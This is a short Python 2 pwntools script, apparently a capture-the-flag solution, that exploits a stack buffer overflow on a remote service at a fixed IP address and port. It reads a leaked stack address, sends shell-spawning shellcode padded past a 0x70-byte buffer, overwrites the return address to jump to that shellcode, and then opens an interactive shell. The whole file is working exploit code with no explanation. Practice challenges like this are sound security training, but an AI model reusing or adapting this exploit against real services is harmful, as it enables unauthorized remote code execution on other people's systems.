#!/usr/bin/env python2

from pwn import *
context.arch = 'amd64'
# stack size 0x70

p = remote('140.110.112.192', 2119)
rsp = int(str(p.recvuntil('\n', drop='True')[32:]), 16)
p.sendline(asm(shellcraft.sh()) + 'A' * (0x70 + 8 - len(asm(shellcraft.sh()))) + p64(rsp))

p.interactive()
p.close()
